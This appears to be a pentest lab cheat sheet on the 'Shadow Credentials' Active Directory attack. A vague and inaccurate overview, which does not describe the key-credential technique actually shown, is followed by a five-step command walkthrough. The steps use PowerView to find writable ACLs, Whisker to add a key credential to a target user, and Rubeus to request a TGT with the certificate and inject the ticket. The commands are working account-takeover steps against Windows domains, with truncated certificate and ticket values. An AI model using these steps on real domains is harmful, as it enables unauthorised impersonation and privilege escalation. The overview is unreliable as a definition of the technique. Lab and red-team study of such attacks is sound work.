# 🟢 Shadow Credentials

#### Shadow Credentials: An Overview

Shadow credentials refer to authentication methods or credentials that are not directly managed or visible through the primary security systems in an organization. These can arise from various scenarios such as legacy systems, improperly decommissioned accounts, or unauthorized user-created access points.

**Key Features:**

* **Hidden Access Points:** These credentials exist outside the purview of standard security protocols, making them hard to detect and manage.
* **Security Risk:** They increase the attack surface for cyber threats, as attackers can exploit these overlooked credentials.
* **Management Challenge:** Identifying and managing shadow credentials require specialized tools and vigilance.

**Mitigation Strategies:**

1. **Regular Audits:** Conduct comprehensive security audits to detect and assess unauthorized access points.
2. **Access Management Policies:** Implement strict policies and procedures for creating, modifying, and retiring user accounts and credentials.
3. **Continuous Monitoring:** Use security tools capable of monitoring and alerting on suspicious activities related to credential access.

Shadow credentials pose a significant security risk, and addressing them should be a priority for any organization's cybersecurity strategy.

### Abusing User Object

#### 1. Enumerate the permissions

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

#### 2. Add the Shadow Credential

```
Whisker.exe add /target:supportXuser
```

#### 3. Using PowerView, see if the Shadow Credential is added.

```
Get-DomainUser -Identity supportXuser
```

#### 4. Request the TGT by leveraging the certificate

```
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```

#### 5. Inject the TGT in the current session or use the NTLM hash

```
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```
